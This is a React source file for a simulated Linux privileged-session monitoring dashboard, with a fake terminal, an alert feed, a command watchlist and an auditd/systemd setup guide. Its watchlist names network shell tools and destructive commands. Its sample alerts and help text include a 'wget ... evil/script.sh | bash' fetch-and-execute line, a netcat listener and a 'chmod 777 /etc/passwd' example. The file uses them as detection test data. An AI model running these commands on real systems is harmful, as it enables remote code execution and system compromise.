import React, { useState, useEffect, useRef } from 'react';
import { 
  Shield, 
  Terminal as TerminalIcon, 
  Activity, 
  AlertTriangle, 
  Settings, 
  FileText, 
  RefreshCw, 
  Trash2, 
  Plus, 
  Check, 
  Copy, 
  BookOpen, 
  Volume2, 
  VolumeX,
  Server,
  TrendingUp,
  Cpu,
  Clock,
  UserCheck
} from 'lucide-react';
import confetti from 'canvas-confetti';

// Initial watchlist based on the original Python script
const INITIAL_WATCHLIST = ["rm -rf", "nc", "nmap", "wget", "curl", "scp", "bash -i", "mkfs", "dd if=", "chmod 777"];

// Simulated seed data for alerts
const INITIAL_ALERTS = [
  {
    id: 1,
    timestamp: new Date(Date.now() - 4 * 60000).toISOString(),
    command: "sudo rm -rf /etc/udev/rules.d/99-custom.rules",
    user: "aman",
    pid: 14208,
    parentPid: 14190,
    severity: "critical",
    ruleMatched: "rm -rf"
  },
  {
    id: 2,
    timestamp: new Date(Date.now() - 15 * 60000).toISOString(),
    command: "sudo nc -lvp 4444",
    user: "aman",
    pid: 13912,
    parentPid: 13900,
    severity: "critical",
    ruleMatched: "nc"
  },
  {
    id: 3,
    timestamp: new Date(Date.now() - 35 * 60000).toISOString(),
    command: "nmap -sS -O 192.168.1.0/24",
    user: "john_security",
    pid: 12104,
    parentPid: 12080,
    severity: "warning",
    ruleMatched: "nmap"
  },
  {
    id: 4,
    timestamp: new Date(Date.now() - 90 * 60000).toISOString(),
    command: "sudo wget -qO- https://raw.githubusercontent.com/evil/script.sh | bash",
    user: "aman",
    pid: 9402,
    parentPid: 9380,
    severity: "critical",
    ruleMatched: "wget"
  }
];

export default function App() {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [alerts, setAlerts] = useState(INITIAL_ALERTS);
  const [watchlist, setWatchlist] = useState(INITIAL_WATCHLIST);
  const [newWatchWord, setNewWatchWord] = useState('');
  const [cooldown, setCooldown] = useState(300); // 5 mins in seconds
  const [audioEnabled, setAudioEnabled] = useState(true);
  const [copiedIndex, setCopiedIndex] = useState(null);
  
  // Terminal simulator state
  const [terminalHistory, setTerminalHistory] = useState([
    { type: 'output', text: '🔐 Sentinel Linux Privileged Session Monitor Simulator v1.0.0' },
    { type: 'output', text: 'Type "help" to see available commands or try triggering an alert!' },
    { type: 'output', text: 'Example: "sudo wget http://malicious-domain.com/payload.sh" or "sudo nc -lvp 4444"' },
    { type: 'output', text: '' }
  ]);
  const [terminalInput, setTerminalInput] = useState('');
  const terminalBottomRef = useRef(null);

  // Stats calculation
  const totalAlerts = alerts.length;
  const criticalAlerts = alerts.filter(a => a.severity === 'critical').length;
  const warningAlerts = alerts.filter(a => a.severity === 'warning').length;
  const watchRulesCount = watchlist.length;

  // Sound alert simulator
  const playAlertSound = (severity) => {
    if (!audioEnabled) return;
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      
      osc.connect(gain);
      gain.connect(ctx.destination);
      
      if (severity === 'critical') {
        // High-low alarm pattern
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(600, ctx.currentTime);
        osc.frequency.setValueAtTime(400, ctx.currentTime + 0.15);
        gain.gain.setValueAtTime(0.15, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
        osc.start();
        osc.stop(ctx.currentTime + 0.4);
      } else {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(800, ctx.currentTime);
        gain.gain.setValueAtTime(0.1, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.2);
        osc.start();
        osc.stop(ctx.currentTime + 0.2);
      }
    } catch (e) {
      console.log("Audio not allowed or supported yet:", e);
    }
  };

  // Auto-scroll terminal to bottom
  useEffect(() => {
    if (terminalBottomRef.current) {
      terminalBottomRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalHistory]);

  const handleTerminalSubmit = (e) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;

    const cmd = terminalInput.trim();
    const newHistory = [...terminalHistory, { type: 'input', text: cmd }];
    
    // Command parser simulation
    let outputText = '';
    let isMatched = false;
    let matchedRule = '';
    let severity = 'warning';

    const cmdLower = cmd.toLowerCase();

    // Check watchlist match
    for (let word of watchlist) {
      if (cmdLower.includes(word.toLowerCase())) {
        isMatched = true;
        matchedRule = word;
        if (word === "rm -rf" || word === "nc" || word === "bash -i" || word === "chmod 777" || word === "dd if=") {
          severity = 'critical';
        }
        break;
      }
    }

    // Custom response details
    if (cmdLower === 'help') {
      outputText = `Available commands for simulation:
  - sudo wget http://example.com/payload.sh  (Triggers 'wget' alert)
  - sudo nc -lvp 4444                         (Triggers 'nc' alert)
  - sudo rm -rf /opt/malicious                (Triggers 'rm -rf' alert)
  - nmap -sS 192.168.1.1                     (Triggers 'nmap' alert)
  - sudo chmod 777 /etc/passwd                (Triggers 'chmod 777' alert)
  - whoami                                    (Standard output)
  - ls                                        (Standard output)
  - clear                                     (Clears screen)`;
    } else if (cmdLower === 'clear') {
      setTerminalHistory([]);
      setTerminalInput('');
      return;
    } else if (cmdLower === 'whoami') {
      outputText = 'root';
    } else if (cmdLower === 'ls') {
      outputText = 'alert_files/  README.md  Screenshot_2025-06-22_13_34_33.png  package.json  src/';
    } else if (cmdLower === 'pwd') {
      outputText = '/home/aman/privileged-session-monitor';
    } else if (cmdLower.includes('wget') || cmdLower.includes('curl')) {
      outputText = `Connecting to raw.githubusercontent.com... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10420 (10K) [text/plain]
Saving to: 'payload.sh'

     0K .......... .......... .......... .......... .......... 100% 1.2M/s

2026-07-13 10:50:00 (1.2 MB/s) - 'payload.sh' saved [10420/10420]`;
    } else if (cmdLower.includes('nc')) {
      outputText = 'Listening on [0.0.0.0] (family 2, port 4444)...';
    } else if (cmdLower.includes('rm -rf')) {
      outputText = 'rm: cannot remove directory "/etc": Permission denied (Simulation Blocked Root Purge)';
    } else if (cmdLower.includes('nmap')) {
      outputText = `Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for local-server (192.168.1.1)
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds`;
    } else if (cmdLower.includes('chmod 777')) {
      outputText = "chmod: changing permissions of '/etc/passwd': Operation not permitted";
    } else {
      outputText = `Executing: ${cmd}... done. (No alerts triggered)`;
    }

    setTerminalHistory([...newHistory, { type: 'output', text: outputText }]);
    setTerminalInput('');

    // Trigger monitor alert if matched
    if (isMatched) {
      const newAlert = {
        id: Date.now(),
        timestamp: new Date().toISOString(),
        command: cmd,
        user: cmdLower.includes('sudo') ? 'root' : 'aman',
        pid: Math.floor(Math.random() * 5000) + 15000,
        parentPid: Math.floor(Math.random() * 5000) + 10000,
        severity: severity,
        ruleMatched: matchedRule
      };
      
      setAlerts(prev => [newAlert, ...prev]);
      playAlertSound(severity);

      // Trigger standard confetti for critical alerts to surprise the user
      if (severity === 'critical') {
        confetti({
          particleCount: 80,
          spread: 60,
          origin: { y: 0.8 },
          colors: ['#f43f5e', '#06b6d4', '#ffffff']
        });
      }
    }
  };

  const handleAddWatchword = (e) => {
    e.preventDefault();
    if (!newWatchWord.trim()) return;
    if (watchlist.includes(newWatchWord.trim())) return;
    
    setWatchlist(prev => [...prev, newWatchWord.trim()]);
    setNewWatchWord('');
  };

  const handleRemoveWatchword = (word) => {
    setWatchlist(prev => prev.filter(w => w !== word));
  };

  const handleClearAlerts = () => {
    setAlerts([]);
  };

  const handleCopyCode = (text, index) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(index);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  // Chart data calculations
  const getCommandStats = () => {
    const counts = {};
    watchlist.forEach(w => { counts[w] = 0; });
    alerts.forEach(a => {
      if (counts[a.ruleMatched] !== undefined) {
        counts[a.ruleMatched] += 1;
      } else if (a.ruleMatched) {
        counts[a.ruleMatched] = 1;
      }
    });

    return Object.entries(counts)
      .map(([name, count]) => ({ name, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);
  };

  const commandChartData = getCommandStats();
  const maxChartCount = Math.max(...commandChartData.map(d => d.count), 1);

  return (
    <div className="app-container">
      {/* Toast Notification for Real-Time Alert Alerts */}
      <div className="toast-container">
        {alerts.slice(0, 1).map((alert) => {
          // Only show toast if it's less than 5 seconds old
          const isRecent = (Date.now() - new Date(alert.timestamp).getTime()) < 5000;
          if (!isRecent) return null;
          return (
            <div key={alert.id} className={`toast ${alert.severity}`}>
              <div className={`toast-icon ${alert.severity}`}>
                <AlertTriangle size={24} />
              </div>
              <div className="toast-body">
                <div className="toast-title">🔐 Critical Action Monitored</div>
                <div className="toast-desc">{alert.command}</div>
                <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px' }}>
                  Rule Matched: {alert.ruleMatched} | User: {alert.user}
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Header */}
      <header className="header">
        <div className="brand">
          <div className="brand-logo">
            <Shield size={24} color="#000" />
          </div>
          <div>
            <h1 className="brand-title">SENTINEL</h1>
            <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Linux Privileged Session Monitor</span>
          </div>
        </div>
        
        <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
          <button 
            className="btn btn-secondary" 
            style={{ padding: '6px 12px', borderRadius: '50px', fontSize: '12px' }}
            onClick={() => setAudioEnabled(!audioEnabled)}
          >
            {audioEnabled ? <Volume2 size={16} /> : <VolumeX size={16} />}
            {audioEnabled ? 'Audio On' : 'Muted'}
          </button>
          
          <div className="status-badge">
            <Activity className="blink" size={16} />
            <span>Agent Active (PID: 2841)</span>
          </div>
        </div>
      </header>

      {/* Tabs Menu */}
      <div className="tabs-container">
        <button 
          className={`tab-btn ${activeTab === 'dashboard' ? 'active' : ''}`}
          onClick={() => setActiveTab('dashboard')}
        >
          <Activity size={16} style={{ marginRight: '6px', verticalAlign: 'middle' }} />
          Dashboard
        </button>
        <button 
          className={`tab-btn ${activeTab === 'settings' ? 'active' : ''}`}
          onClick={() => setActiveTab('settings')}
        >
          <Settings size={16} style={{ marginRight: '6px', verticalAlign: 'middle' }} />
          Rules & Cooldown
        </button>
        <button 
          className={`tab-btn ${activeTab === 'guide' ? 'active' : ''}`}
          onClick={() => setActiveTab('guide')}
        >
          <BookOpen size={16} style={{ marginRight: '6px', verticalAlign: 'middle' }} />
          Setup Guide
        </button>
      </div>

      {activeTab === 'dashboard' && (
        <>
          {/* Stats Bar */}
          <div className="dashboard-grid">
            <div className="glass-card stat-card" style={{ borderLeft: '4px solid var(--color-cyan)' }}>
              <div className="stat-icon" style={{ backgroundColor: 'rgba(6, 182, 212, 0.1)', color: 'var(--color-cyan)' }}>
                <Activity size={24} />
              </div>
              <div className="stat-info">
                <span className="stat-value">{totalAlerts}</span>
                <span className="stat-label">Total Audit Events</span>
              </div>
            </div>

            <div className="glass-card stat-card" style={{ borderLeft: '4px solid var(--color-rose)' }}>
              <div className="stat-icon" style={{ backgroundColor: 'rgba(244, 63, 94, 0.1)', color: 'var(--color-rose)' }}>
                <AlertTriangle size={24} />
              </div>
              <div className="stat-info">
                <span className="stat-value">{criticalAlerts}</span>
                <span className="stat-label">Critical Alerts</span>
              </div>
            </div>

            <div className="glass-card stat-card" style={{ borderLeft: '4px solid var(--color-amber)' }}>
              <div className="stat-icon" style={{ backgroundColor: 'rgba(245, 158, 11, 0.1)', color: 'var(--color-amber)' }}>
                <Shield size={24} />
              </div>
              <div className="stat-info">
                <span className="stat-value">{watchRulesCount}</span>
                <span className="stat-label">Command Watch Rules</span>
              </div>
            </div>

            <div className="glass-card stat-card" style={{ borderLeft: '4px solid var(--color-emerald)' }}>
              <div className="stat-icon" style={{ backgroundColor: 'rgba(16, 185, 129, 0.1)', color: 'var(--color-emerald)' }}>
                <Server size={24} />
              </div>
              <div className="stat-info">
                <span className="stat-value">3</span>
                <span className="stat-label">Active Monitored Hosts</span>
              </div>
            </div>
          </div>

          {/* Main Terminal + Alerts layout */}
          <div className="main-layout">
            <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
              
              {/* Terminal Simulator */}
              <div className="glass-card terminal-card">
                <div className="terminal-header">
                  <div className="terminal-buttons">
                    <span className="terminal-dot red"></span>
                    <span className="terminal-dot yellow"></span>
                    <span className="terminal-dot green"></span>
                  </div>
                  <div className="terminal-title">aman@sentinel-security-agent:~</div>
                  <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Interactive Simulation</div>
                </div>
                <div className="terminal-body">
                  {terminalHistory.map((item, idx) => {
                    if (item.type === 'input') {
                      return (
                        <div key={idx} className="terminal-input-container" style={{ marginTop: '4px' }}>
                          <span className="terminal-prompt">aman@sentinel:~$</span>
                          <span>{item.text}</span>
                        </div>
                      );
                    }
                    return (
                      <div key={idx} style={{ whiteSpace: 'pre-wrap', margin: '4px 0', color: '#10b981' }}>
                        {item.text}
                      </div>
                    );
                  })}
                  <div ref={terminalBottomRef} />
                  
                  <form onSubmit={handleTerminalSubmit} className="terminal-input-container">
                    <span className="terminal-prompt">aman@sentinel:~$</span>
                    <input 
                      type="text" 
                      className="terminal-input"
                      value={terminalInput}
                      onChange={(e) => setTerminalInput(e.target.value)}
                      placeholder="Type command here... (try: sudo nc -lvp 4444)"
                      autoFocus
                    />
                  </form>
                </div>
              </div>

              {/* Analytics Panel */}
              <div className="glass-card">
                <div className="panel-header">
                  <h2 className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <TrendingUp size={18} color="var(--color-cyan)" />
                    Real-time Threat Intelligence & Analytics
                  </h2>
                </div>
                <div className="panel-body" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
                  
                  {/* Chart 1: Top Triggered Rules */}
                  <div className="chart-container">
                    <h3 style={{ fontSize: '13px', color: 'var(--text-secondary)', marginBottom: '14px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                      Top Watchlist Hits
                    </h3>
                    {commandChartData.length === 0 ? (
                      <div style={{ color: 'var(--text-muted)', fontSize: '13px', padding: '20px 0' }}>No logs collected. Try executing simulated commands in the terminal!</div>
                    ) : (
                      commandChartData.map((data, idx) => (
                        <div key={idx} className="chart-bar-row">
                          <span className="chart-label">{data.name}</span>
                          <div className="chart-bar-bg">
                            <div 
                              className={`chart-bar-fill ${data.count > 1 ? 'rose' : 'cyan'}`}
                              style={{ width: `${(data.count / maxChartCount) * 100}%` }}
                            ></div>
                          </div>
                          <span className="chart-value">{data.count}</span>
                        </div>
                      ))
                    )}
                  </div>

                  {/* Chart 2: System Health metrics simulation */}
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', justifyContent: 'center' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', padding: '10px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid var(--border-color)' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <Cpu size={16} color="var(--color-cyan)" />
                        <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Log Parsing Latency</span>
                      </div>
                      <span style={{ fontFamily: 'var(--font-mono)', fontSize: '13px', fontWeight: 'bold', color: 'var(--color-emerald)' }}>&lt; 0.2ms</span>
                    </div>

                    <div style={{ display: 'flex', justifySelf: 'stretch', justifyContent: 'space-between', padding: '10px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid var(--border-color)' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <Clock size={16} color="var(--color-amber)" />
                        <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Rule Match Interval</span>
                      </div>
                      <span style={{ fontFamily: 'var(--font-mono)', fontSize: '13px', fontWeight: 'bold' }}>{cooldown}s cooldown</span>
                    </div>

                    <div style={{ display: 'flex', justifyContent: 'space-between', padding: '10px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px', border: '1px solid var(--border-color)' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <UserCheck size={16} color="var(--color-emerald)" />
                        <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Audit Daemon Status</span>
                      </div>
                      <span style={{ fontFamily: 'var(--font-mono)', fontSize: '13px', fontWeight: 'bold', color: 'var(--color-emerald)' }}>RUNNING</span>
                    </div>
                  </div>

                </div>
              </div>

            </div>

            {/* Live Alerts Stream */}
            <div className="glass-card panel-card">
              <div className="panel-header">
                <h2 className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Activity size={18} color="var(--color-rose)" />
                  Audit Event Stream
                </h2>
                <button 
                  className="btn btn-secondary" 
                  style={{ padding: '6px 12px', display: 'flex', alignItems: 'center', gap: '4px', fontSize: '12px' }}
                  onClick={handleClearAlerts}
                >
                  <Trash2 size={14} />
                  Clear Logs
                </button>
              </div>
              <div className="panel-body">
                {alerts.length === 0 ? (
                  <div style={{ display: 'flex', flexDirection: 'column', height: '100%', alignItems: 'center', justifyContent: 'center', color: 'var(--text-muted)' }}>
                    <Shield size={36} style={{ marginBottom: '12px', opacity: '0.4' }} />
                    <p style={{ fontSize: '14px' }}>No session events detected yet</p>
                    <p style={{ fontSize: '12px', marginTop: '4px' }}>Execute watchlisted commands in the terminal simulator!</p>
                  </div>
                ) : (
                  alerts.map((alert) => (
                    <div key={alert.id} className={`alert-item ${alert.severity}`}>
                      <div className="alert-header">
                        <span className={`alert-tag ${alert.severity}`}>
                          {alert.severity}
                        </span>
                        <span className="alert-time">
                          {new Date(alert.timestamp).toLocaleTimeString()}
                        </span>
                      </div>
                      <div className="alert-cmd">{alert.command}</div>
                      <div className="alert-meta">
                        <div className="meta-field">
                          <UserCheck size={12} />
                          <span>user: <b>{alert.user}</b></span>
                        </div>
                        <div className="meta-field">
                          <span>pid: <b>{alert.pid}</b></span>
                        </div>
                        <div className="meta-field">
                          <span>rule: <b>{alert.ruleMatched}</b></span>
                        </div>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </>
      )}

      {activeTab === 'settings' && (
        <div className="glass-card" style={{ maxWidth: '800px', margin: '0 auto', padding: '24px' }}>
          <h2 className="panel-title" style={{ borderBottom: '1px solid var(--border-color)', paddingBottom: '12px', marginBottom: '24px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Settings size={20} color="var(--color-cyan)" />
            Alert Daemon Watchlist & Config
          </h2>
          
          <form onSubmit={handleAddWatchword} className="form-group">
            <label className="form-label">Add Suspect Command Signature</label>
            <div style={{ display: 'flex', gap: '10px' }}>
              <input 
                type="text" 
                className="input-text" 
                value={newWatchWord}
                onChange={(e) => setNewWatchWord(e.target.value)}
                placeholder="e.g., docker run, cat /etc/shadow, sftp"
              />
              <button type="submit" className="btn btn-primary" style={{ display: 'flex', alignItems: 'center' }}>
                <Plus size={16} /> Add Rule
              </button>
            </div>
          </form>

          <div className="form-group">
            <label className="form-label">Active Command Watch Rules ({watchlist.length})</label>
            <div style={{ background: 'rgba(0,0,0,0.2)', padding: '16px', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-color)' }}>
              {watchlist.map((word, idx) => (
                <span key={idx} className="keyword-pill">
                  {word}
                  <button 
                    onClick={() => handleRemoveWatchword(word)} 
                    className="keyword-pill-remove"
                    title="Remove rule"
                  >
                    ×
                  </button>
                </span>
              ))}
            </div>
          </div>

          <div className="form-group" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px', marginTop: '24px' }}>
            <div>
              <label className="form-label">Cooling-off (Reset) Interval (seconds)</label>
              <input 
                type="number" 
                className="input-text" 
                value={cooldown} 
                onChange={(e) => setCooldown(Number(e.target.value))}
                min="5" 
                max="3600"
              />
              <span style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'block', marginTop: '4px' }}>
                Prevents spamming notifications by silencing the same alert flag within this duration.
              </span>
            </div>
            <div>
              <label className="form-label">Notification Audio Profile</label>
              <div style={{ display: 'flex', gap: '10px', marginTop: '4px' }}>
                <button 
                  className={`btn ${audioEnabled ? 'btn-primary' : 'btn-secondary'}`}
                  style={{ flex: 1 }}
                  type="button"
                  onClick={() => {
                    setAudioEnabled(true);
                    playAlertSound('critical');
                  }}
                >
                  Enable & Test Audio
                </button>
                <button 
                  className={`btn ${!audioEnabled ? 'btn-danger' : 'btn-secondary'}`}
                  style={{ flex: 1 }}
                  type="button"
                  onClick={() => setAudioEnabled(false)}
                >
                  Mute Alerts
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {activeTab === 'guide' && (
        <div className="glass-card" style={{ maxWidth: '900px', margin: '0 auto', overflow: 'hidden' }}>
          <div className="panel-header">
            <h2 className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <BookOpen size={20} color="var(--color-emerald)" />
              Linux Production Deployment & Service Guide
            </h2>
          </div>
          <div className="doc-section">
            <p>
              To run the Sentinel session monitoring script on a live Linux server (supporting Ubuntu/Debian/RHEL), follow the configuration steps below to link the security rules into the audit daemon sub-system.
            </p>

            <h3>1. Install Essential Daemons</h3>
            <p>Install the Linux audit daemon and notification packages:</p>
            <div className="code-block">
              sudo apt-get update && sudo apt-get install -y auditd libnotify-bin python3
              <span 
                className="copy-badge" 
                onClick={() => handleCopyCode("sudo apt-get update && sudo apt-get install -y auditd libnotify-bin python3", 1)}
              >
                {copiedIndex === 1 ? <Check size={12} /> : <Copy size={12} />}
                {copiedIndex === 1 ? 'Copied' : 'Copy'}
              </span>
            </div>

            <h3>2. Apply Audit Rules Configuration</h3>
            <p>Write rules to monitor execution of commands at root levels inside <code>/etc/audit/rules.d/privmon.rules</code>:</p>
            <div className="code-block">
              {`-w /usr/bin/sudo -p x -k sudo-usage
-w /bin/bash -p x -k shell-usage
-a always,exit -F arch=b64 -S execve -F euid=0 -k exec-root`}
              <span 
                className="copy-badge" 
                onClick={() => handleCopyCode(`-w /usr/bin/sudo -p x -k sudo-usage\n-w /bin/bash -p x -k shell-usage\n-a always,exit -F arch=b64 -S execve -F euid=0 -k exec-root`, 2)}
              >
                {copiedIndex === 2 ? <Check size={12} /> : <Copy size={12} />}
                {copiedIndex === 2 ? 'Copied' : 'Copy'}
              </span>
            </div>

            <h3>3. Setup Main Python Script</h3>
            <p>
              Copy our monitoring python script to <code>/opt/priv_alerts.py</code>. This script parses incoming logs and launches notifications.
            </p>
            <div className="code-block">
              {`sudo cp alert_files/priv_alerts.py /opt/
sudo chmod +x /opt/priv_alerts.py`}
              <span 
                className="copy-badge" 
                onClick={() => handleCopyCode("sudo cp alert_files/priv_alerts.py /opt/\nsudo chmod +x /opt/priv_alerts.py", 3)}
              >
                {copiedIndex === 3 ? <Check size={12} /> : <Copy size={12} />}
                {copiedIndex === 3 ? 'Copied' : 'Copy'}
              </span>
            </div>

            <h3>4. Persist Monitoring as a systemd service</h3>
            <p>
              Create a systemd unit file at <code>/etc/systemd/system/priv-alert.service</code> to ensure background execution and automatic recovery upon restart:
            </p>
            <div className="code-block">
              {`[Unit]
Description=Linux Privileged Session Monitor
After=graphical.target

[Service]
ExecStart=/usr/bin/env bash -c 'DISPLAY=:0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus /usr/bin/python3 /opt/priv_alerts.py'
Restart=always
User=root

[Install]
WantedBy=default.target`}
              <span 
                className="copy-badge" 
                onClick={() => handleCopyCode(`[Unit]\nDescription=Linux Privileged Session Monitor\nAfter=graphical.target\n\n[Service]\nExecStart=/usr/bin/env bash -c 'DISPLAY=:0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus /usr/bin/python3 /opt/priv_alerts.py'\nRestart=always\nUser=root\n\n[Install]\nWantedBy=default.target`, 4)}
              >
                {copiedIndex === 4 ? <Check size={12} /> : <Copy size={12} />}
                {copiedIndex === 4 ? 'Copied' : 'Copy'}
              </span>
            </div>

            <h3>5. Enable and Start the Services</h3>
            <p>Reload unit files and enable the service immediately:</p>
            <div className="code-block">
              {`sudo systemctl daemon-reload
sudo systemctl enable --now priv-alert.service`}
              <span 
                className="copy-badge" 
                onClick={() => handleCopyCode("sudo systemctl daemon-reload\nsudo systemctl enable --now priv-alert.service", 5)}
              >
                {copiedIndex === 5 ? <Check size={12} /> : <Copy size={12} />}
                {copiedIndex === 5 ? 'Copied' : 'Copy'}
              </span>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer style={{ marginTop: '48px', padding: '24px 0', borderTop: '1px solid var(--border-color)', textAlign: 'center', fontSize: '13px', color: 'var(--text-muted)' }}>
        <p>Sentinel Privileged Session Monitor Dashboard | Designed for Modern Enterprise Intrusion Detection System (IDS)</p>
      </footer>
    </div>
  );
}
